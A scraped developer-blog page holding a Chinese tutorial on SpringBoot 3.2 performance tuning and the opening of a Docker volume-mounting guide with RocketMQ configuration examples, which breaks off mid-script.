                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0"><strong>SpringBoot 3.2 性能优化全攻略：7个让你的应用提速50%的关键技巧</strong></h2>
<h2 data-id="heading-1">引言</h2>
<p>SpringBoot 作为 Java 生态中最流行的微服务框架之一，其易用性和开箱即用的特性深受开发者喜爱。然而，随着应用规模的扩大和业务复杂度的提升，性能问题逐渐成为开发者关注的焦点。SpringBoot 3.2 在性能方面做了多项改进，但如何充分利用这些特性并进一步优化应用，仍然是许多开发者的挑战。</p>
<p>本文将深入探讨 <strong>7 个关键技巧</strong>，涵盖从代码优化到基础设施调优的全方位实践，帮助你将 SpringBoot 应用的性能提升 <strong>50% 甚至更多</strong>。无论你是正在迁移到 SpringBoot 3.2，还是希望优化现有应用，这些技巧都能为你提供切实可行的指导。</p>
<hr/>
<h2 data-id="heading-2">主体</h2>
<h3 data-id="heading-3">1. <strong>启用 SpringBoot 3.2 的新特性：虚拟线程（Virtual Threads）</strong></h3>
<p>Java 21 引入了虚拟线程（Project Loom），而 SpringBoot 3.2 对其提供了原生支持。虚拟线程可以显著减少线程创建和上下文切换的开销，特别适合高并发场景。</p>
<h4 data-id="heading-4"><strong>如何启用？</strong></h4>
<pre><code class="hljs language-properties" lang="properties">spring.threads.virtual.enabled=true
</code></pre>
<h4 data-id="heading-5"><strong>适用场景</strong></h4>
<ul>
<li>I/O密集型任务（如数据库查询、HTTP请求）。</li>
<li>高并发微服务场景。</li>
</ul>
<h4 data-id="heading-6"><strong>注意事项</strong></h4>
<ul>
<li>CPU密集型任务可能不会受益于虚拟线程。</li>
<li>JDK必须升级至21或更高版本。</li>
</ul>
<hr/>
<h3 data-id="heading-7">2. <strong>优化 JVM 参数：选择合适的垃圾收集器</strong></h3>
<p>JVM的垃圾收集策略直接影响应用的吞吐量和延迟。SpringBoot默认使用G1 GC（Garbage-First），但在不同负载下可能需要调整或更换GC策略。</p>
<h4 data-id="heading-8"><strong>推荐配置</strong></h4>
<ul>
<li><strong>低延迟场景（如金融交易系统）</strong>: ZGC或Shenandoah GC</li>
</ul>
<pre><code class="hljs language-bash" lang="bash">java -jar your-app.jar -XX:+UseZGC -Xmx4g -Xms4g
</code></pre>
<ul>
<li><strong>高吞吐量场景（如批处理任务）</strong>: G1 GC或Parallel GC</li>
</ul>
<h4 data-id="heading-9"><strong>关键调优点</strong></h4>
<ul>
<li><code>MaxGCPauseMillis</code>：控制最大停顿时间（默认200ms）。</li>
<li><code>InitiatingHeapOccupancyPercent</code>：触发GC的堆占用百分比（默认45%）。</li>
</ul>
<hr/>
<h3 data-id="heading-10">3. <strong>利用 GraalVM Native Image （AOT编译）减少启动时间和内存占用</strong></h3>
<p>GraalVM Native Image可以将SpringBoot应用编译为本地可执行文件，极大降低启动时间和内存消耗（通常减少50%以上）。Spring Boot3.2对GraalVM的支持更加成熟。</p>
<h4 data-id="heading-11"><strong>实现步骤</strong></h4>
<p>1.添加依赖：</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.experimental<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-aot<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>0.11.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
</code></pre>
<p>2.生成Native镜像:</p>
<pre><code class="hljs language-bash" lang="bash">mvn spring-boot:build-image -DskipTests
</code></pre>
<h4 data-id="heading-12"><strong>优缺点分析</strong></h4>
<p>✅ 优势：极快的启动速度（毫秒级）、更低的内存占用。<br/>
❌ 限制：反射/动态代理需要额外配置、调试复杂度较高。</p>
<hr/>
<h3 data-id="heading-13">4. <strong>合理设计缓存策略：避免重复计算与I/O开销</strong></h3>
<p>缓存是提升性能的银弹之一，但错误的使用会导致数据不一致或内存泄漏。SpringBoot提供了多种缓存抽象（Caffeine、Redis等）。</p>
<h4 data-id="heading-14"><strong>最佳实践建议</strong></h4>
<p>1.<strong>多级缓存架构</strong>: Local Cache + Redis分布式缓存。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Cacheable(value = "userCache", key = "#id")</span>
<span class="hljs-keyword">public</span> User <span class="hljs-title function_">getUser</span><span class="hljs-params">(Long id)</span> {
    <span class="hljs-comment">// DB查询逻辑...</span>
}
</code></pre>
<p>2.<strong>避免缓存击穿</strong>:</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Cacheable(cacheNames="users", sync=true)</span>
<span class="hljs-keyword">public</span> User <span class="hljs-title function_">findById</span><span class="hljs-params">(Long id)</span> { ... }
</code></pre>
<hr/>
<p>###5.<strong>数据库访问层优化：JPA/Hibernate调优</strong></p>
<p>数据库通常是性能瓶颈所在,以下是一些关键优化点:</p>
<p>#####a)启用Hibernate二级缓存:</p>
<pre><code class="hljs language-properties" lang="properties">spring.jpa.properties.hibernate.cache.use_second_level_cache=true
spring.jpa.properties.hibernate.cache.provider_class=org.ehcache.jsr107.EhcacheCachingProvider
</code></pre>
<p>#####b)批量处理N+1查询问题:</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">// Bad: </span>
List&lt;User&gt; users = userRepository<span class="hljs-selector-class">.findAll</span>();
users<span class="hljs-selector-class">.forEach</span>(u -&gt; System.out.println(u.getOrders())); <span class="hljs-comment">// N+1 queries!</span>

<span class="hljs-comment">// Good:</span>
<span class="hljs-keyword">@Query</span>(<span class="hljs-string">"SELECT u FROM User u JOIN FETCH u.orders"</span>)
List&lt;User&gt; findAllWithOrders();
</code></pre>
<hr/>
<p>###6.<strong>HTTP/2与连接池配置</strong></p>
<p>网络传输效率对微服务至关重要:</p>
<p>#####a)强制启用HTTP/2(需TLS):</p>
<pre><code class="hljs language-properties" lang="properties">server.http2.enabled=true
</code></pre>
<p>#####b)WebClient连接池配置(适用于Reactive应用):</p>
<pre><code class="hljs language-scss" lang="scss">HttpClient<span class="hljs-selector-class">.create</span>()
          <span class="hljs-selector-class">.option</span>(ChannelOption.CONNECT_TIMEOUT_MILLIS,<span class="hljs-number">5000</span>)
          <span class="hljs-selector-class">.doOnConnected</span>(c-&gt;c.addHandlerLast(new ReadTimeoutHandler(<span class="hljs-number">10</span>)));
</code></pre>
<hr/>
<p>###7.<strong>监控与持续优化:使用Micrometer+Actuator</strong></p>
<p>没有度量就没有优化.Spring Boot Actuator提供丰富的监控端点:</p>
<p>#####核心指标采集配置:</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-attr">management.endpoints.web.exposure.include</span>=health,metrics,prometheus

<span class="hljs-comment"># Prometheus示例格式输出:</span>
http_server_requests_seconds_count{<span class="hljs-attr">uri</span>=<span class="hljs-string">"/api/users"</span>,status=<span class="hljs-string">"200"</span>}<span class="hljs-number">42</span>`
</code></pre>
<p>通过Grafana仪表盘可直观发现性能瓶颈.</p>
<hr/>
<p>##总结</p>
<p>本文介绍的7大技巧从JVM底层到架构层面全方位覆盖了Spring Boot性能优化的关键路径:</p>
<p>1️⃣利用虚拟线程处理高并发IO<br/>
2️⃣精细调节JVM参数<br/>
3️⃣原生编译技术降本增效<br/>
4️⃣智能缓存减轻后端压力<br/>
5️⃣ORM层深度调优<br/>
6️⃣网络传输协议升级<br/>
7️⃣建立可观测性体系</p>
<p>实际应用中需要根据具体场景组合搭配这些策略.A/B测试是验证效果的最佳方式.Spring Boot的强大之处在于它提供了充分的灵活性让开发者可以在"约定优于配置"的基础上进行深度定制.</p>
<p>真正的极致性能来源于对每个技术组件的深刻理解与合理运用,希望本指南能帮助您的应用突破性能瓶颈!</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Docker 数据持久化完全指南：四种挂载方式详解与实战]]></title>    <link>https://juejin.cn/post/7575751471842295844</link>    <guid>https://juejin.cn/post/7575751471842295844</guid>    <pubDate>2025-11-24T03:43:03.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575751471842295844" data-draft-id="7575651989985935414" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Docker 数据持久化完全指南：四种挂载方式详解与实战"/> <meta itemprop="keywords" content="后端"/> <meta itemprop="datePublished" content="2025-11-24T03:43:03.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="IT橘子皮"/> <meta itemprop="url" content="https://juejin.cn/user/3148645291002232"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Docker 数据持久化完全指南：四种挂载方式详解与实战
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3148645291002232/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    IT橘子皮
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-24T03:43:03.000Z" title="Mon Nov 24 2025 03:43:03 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-24
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    4
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>在 Docker 容器化部署中，数据持久化是至关重要的一环。本文基于您提供的 docker-compose.yml 文件和实际项目场景，详细解析四种主要的 Docker 挂载方式：<strong>绑定挂载</strong>、<strong>命名卷挂载</strong>、<strong>匿名卷挂载</strong>和<strong>目录挂载</strong>，并通过 RocketMQ 微服务项目进行实战演示。</p>
<h2 data-id="heading-0">一、四种挂载方式概述</h2>
<h3 data-id="heading-1">1.1 核心概念对比</h3>








































<table><thead><tr><th>挂载类型</th><th>管理方式</th><th>持久化</th><th>可见性</th><th>适用场景</th></tr></thead><tbody><tr><td><strong>绑定挂载</strong>​</td><td>用户管理</td><td>是</td><td>宿主机可见</td><td>配置文件、开发环境</td></tr><tr><td><strong>命名卷挂载</strong>​</td><td>Docker 管理</td><td>是</td><td>Docker 管理</td><td>数据库数据、生产环境</td></tr><tr><td><strong>匿名卷挂载</strong>​</td><td>Docker 自动</td><td>临时</td><td>隐藏</td><td>缓存、临时数据</td></tr><tr><td><strong>目录挂载</strong>​</td><td>用户管理</td><td>是</td><td>宿主机可见</td><td>日志、共享数据</td></tr></tbody></table>
<h3 data-id="heading-2">1.2 在项目中的实际应用</h3>
<p>根据您的 docker-compose.yml 文件：</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-comment"># 绑定挂载 - 配置文件（重点分析）</span>
<span class="hljs-attr">rmqbroker:</span>
  <span class="hljs-attr">volumes:</span>
    <span class="hljs-bullet">-</span> <span class="hljs-string">./broker.conf:/opt/rocketmq/conf/broker.conf</span>

<span class="hljs-comment"># 命名卷挂载 - 数据库数据</span>
<span class="hljs-attr">redis:</span>
  <span class="hljs-attr">volumes:</span>
    <span class="hljs-bullet">-</span> <span class="hljs-string">redis_data:/data</span>
<span class="hljs-attr">mongo:</span>
  <span class="hljs-attr">volumes:</span>
    <span class="hljs-bullet">-</span> <span class="hljs-string">mongo_data:/data/db</span>

<span class="hljs-comment"># 目录挂载 - 应用日志</span>
<span class="hljs-attr">my-springboot-app:</span>
  <span class="hljs-attr">volumes:</span>
    <span class="hljs-bullet">-</span> <span class="hljs-string">./logs:/home/spring/logs</span>

<span class="hljs-comment"># 匿名卷挂载 - rmqnamesrv（无显式配置）</span>
</code></pre>
<h2 data-id="heading-3">二、绑定挂载 (Bind Mounts) 深度解析：配置管理的终极解决方案</h2>
<h3 data-id="heading-4">2.1 技术原理与四大核心优势</h3>
<p>绑定挂载是<strong>直接将宿主机文件系统路径映射到容器内部</strong>的挂载方式。</p>
<h4 data-id="heading-5">✅ 配置外部化 - 配置与镜像分离</h4>
<pre><code class="hljs language-bash" lang="bash">rmqbroker:
  volumes:
    - ./broker.conf:/opt/rocketmq/conf/broker.conf
</code></pre>
<p><strong>实现原理：</strong></p>
<ul>
<li>配置文件完全独立于 Docker 镜像</li>
<li>镜像保持纯净，不包含环境特定配置</li>
<li>同一镜像可适配不同环境（开发、测试、生产）</li>
</ul>
<p><strong>实战价值：</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 不同环境使用不同配置</span>
config/
├── dev/
│   └── broker.conf    <span class="hljs-comment"># 开发环境配置</span>
├── <span class="hljs-built_in">test</span>/
│   └── broker.conf    <span class="hljs-comment"># 测试环境配置</span>
└── prod/
    └── broker.conf    <span class="hljs-comment"># 生产环境配置</span>

<span class="hljs-comment"># 通过环境变量切换配置</span>
docker compose -f docker-compose.yml -f docker-compose.dev.yml up
</code></pre>
<h4 data-id="heading-6">✅ 实时编辑 - 宿主机修改立即生效</h4>
<p><strong>技术实现：</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 1. 宿主机编辑配置文件</span>
vim broker.conf
<span class="hljs-comment"># 修改：brokerRole = SYNC_MASTER</span>

<span class="hljs-comment"># 2. 容器内实时同步（无需重启）</span>
docker compose <span class="hljs-built_in">exec</span> rmqbroker <span class="hljs-built_in">cat</span> /opt/rocketmq/conf/broker.conf
<span class="hljs-comment"># 立即看到：brokerRole = SYNC_MASTER</span>

<span class="hljs-comment"># 3. 热重载配置（部分服务支持）</span>
docker compose <span class="hljs-built_in">exec</span> rmqbroker sh -c <span class="hljs-string">"kill -HUP 1"</span>
</code></pre>
<p><strong>开发效率提升：</strong></p>
<ul>
<li>开发阶段：避免重复构建镜像</li>
<li>调试阶段：快速验证配置变更</li>
<li>运维阶段：紧急配置修复</li>
</ul>
<h4 data-id="heading-7">✅ 版本控制 - 配置文件可纳入 Git 管理</h4>
<p><strong>Git 集成方案：</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 配置文件纳入版本控制</span>
git add broker.conf docker-compose.yml
git commit -m <span class="hljs-string">"feat: update rocketmq broker configuration"</span>

<span class="hljs-comment"># 配置变更追踪</span>
git <span class="hljs-built_in">log</span> --oneline --follow broker.conf
<span class="hljs-comment"># 输出：a1b2c3d 优化Broker内存配置</span>
<span class="hljs-comment">#       e4f5g6h 初始Broker配置</span>

<span class="hljs-comment"># 分支策略管理</span>
git checkout feature/new-cluster
<span class="hljs-comment"># 修改配置测试新功能</span>
</code></pre>
<p><strong>.gitignore 配置示例：</strong></p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-comment"># 忽略生成的文件</span>
<span class="hljs-string">logs/</span>
<span class="hljs-string">data/</span>
<span class="hljs-string">tmp/</span>

<span class="hljs-comment"># 保留配置文件</span>
<span class="hljs-type">!broker.conf</span>
<span class="hljs-type">!application.yml</span>

<span class="hljs-comment"># 忽略本地覆盖配置</span>
<span class="hljs-string">broker.conf.local</span>
<span class="hljs-string">application-*.yml</span>
</code></pre>
<h4 data-id="heading-8">✅ 环境适配 - 不同环境使用不同配置</h4>
<p><strong>多环境配置管理：</strong></p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-comment"># docker-compose.override.yml（开发环境）</span>
<span class="hljs-attr">version:</span> <span class="hljs-string">'3.8'</span>
<span class="hljs-attr">services:</span>
  <span class="hljs-attr">rmqbroker:</span>
    <span class="hljs-attr">volumes:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">./config/dev/broker.conf:/opt/rocketmq/conf/broker.conf</span>
    <span class="hljs-attr">environment:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">JAVA_OPTS=-Xmx512m</span> <span class="hljs-string">-Xms512m</span>

<span class="hljs-comment"># docker-compose.prod.yml（生产环境）</span>
<span class="hljs-attr">version:</span> <span class="hljs-string">'3.8'</span>
<span class="hljs-attr">services:</span>
  <span class="hljs-attr">rmqbroker:</span>
    <span class="hljs-attr">volumes:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">./config/prod/broker.conf:/opt/rocketmq/conf/broker.conf</span>
    <span class="hljs-attr">environment:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">JAVA_OPTS=-Xmx2g</span> <span class="hljs-string">-Xms2g</span>
</code></pre>
<p><strong>环境特定配置示例：</strong></p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># config/dev/broker.conf（开发环境）</span>
<span class="hljs-attr">brokerRole</span> = ASYNC_MASTER
<span class="hljs-attr">flushDiskType</span> = ASYNC_FLUSH
<span class="hljs-attr">autoCreateTopicEnable</span> = <span class="hljs-literal">true</span>

<span class="hljs-comment"># config/prod/broker.conf（生产环境）  </span>
<span class="hljs-attr">brokerRole</span> = SYNC_MASTER
<span class="hljs-attr">flushDiskType</span> = SYNC_FLUSH
<span class="hljs-attr">autoCreateTopicEnable</span> = <span class="hljs-literal">false</span>
</code></pre>
<h3 data-id="heading-9">2.2 项目实战：RocketMQ Broker 配置绑定的完整工作流</h3>
<p><strong>broker.conf 配置文件内容：</strong></p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># RocketMQ Broker 配置 - 外部化配置示例</span>
<span class="hljs-attr">brokerClusterName</span> = <span class="hljs-variable">${CLUSTER_NAME:-DefaultCluster}</span>
<span class="hljs-attr">brokerName</span> = broker-<span class="hljs-variable">${BROKER_ID:-a}</span>
<span class="hljs-attr">brokerId</span> = <span class="hljs-variable">${BROKER_ID:-0}</span>

<span class="hljs-comment"># 消息存储配置</span>
<span class="hljs-attr">deleteWhen</span> = <span class="hljs-number">04</span>
<span class="hljs-attr">fileReservedTime</span> = <span class="hljs-number">48</span>
<span class="hljs-attr">mapedFileSizeCommitLog</span> = <span class="hljs-number">1073741824</span>

<span class="hljs-comment"># 高可用配置</span>
<span class="hljs-attr">brokerRole</span> = <span class="hljs-variable">${BROKER_ROLE:-ASYNC_MASTER}</span>
<span class="hljs-attr">flushDiskType</span> = <span class="hljs-variable">${FLUSH_DISK_TYPE:-ASYNC_FLUSH}</span>

<span class="hljs-comment"># 开发环境特供</span>
<span class="hljs-attr">autoCreateTopicEnable</span> = <span class="hljs-variable">${AUTO_CREATE_TOPIC:-true}</span>
<span class="hljs-attr">autoCreateSubscriptionGroup</span> = <span class="hljs-variable">${AUTO_CREATE_SUBSCRIPTION:-true}</span>

<span class="hljs-comment"># 动态获取NameServer地址</span>
<span class="hljs-attr">namesrvAddr</span> = <span class="hljs-variable">${NAMESRV_ADDR:-rmqnamesrv:9876}</span>
</code></pre>
<p><strong>完整的配置管理流水线：</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-meta">#!/bin/bash</span>
<span class="hljs-comment"># config-pipeline.sh - 配置管理完整工作流</span>

<span class="hljs-comment"># 1. 配置验证</span>
<span class="hljs-function"><span class="hljs-title">validate_config</span></span>() {
    <span class="hljs-built_in">echo</span> <span class="hljs-string">"🔍 验证配置文件语法..."</span>
    docker compose config -q
    <span class="hljs-keyword">if</span> [ $? -eq 0 ]; <span class="hljs-keyword">then</span>
        <span class="hljs-built_in">echo</span> <span class="hljs-string">"✅ 配置文件语法正确"</span>
    <span class="hljs-keyword">else</span>
        <span class="hljs-built_in">echo</span> <span class="hljs-string">"❌ 配置文件存在错误"</span>
        <span class="hljs-built_in">exit</span> 1
    <span class="hljs-keyword">fi</span>
}

<span class="hljs-comment"># 2. 配置差异化检查</span>
<span class="hljs-function"><span class="hljs-title">check_config_diff</span></span>() {
    <span class="hljs-built_in">echo</span> <span class="hljs-string">"📊 检查配置变更..."</span>
    <span class="hljs-keyword">if</span> [ -f <span class="hljs-string">"broker.conf.last"</span> ]; <span class="hljs-keyword">then</span>
        diff -u broker.conf.last broker.conf || <span class="hljs-literal">true</span>
    <span class="hljs-keyword">fi</span>
    <span class="hljs-built_in">cp</span> broker.conf broker.conf.last
}

<span class="hljs-comment"># 3. 安全扫描</span>
<span class="hljs-function"><span class="hljs-title">security_scan</span></span>() {
    <span class="hljs-built_in">echo</span> <span class="hljs-string">"🔒 配置文件安全扫描..."</span>
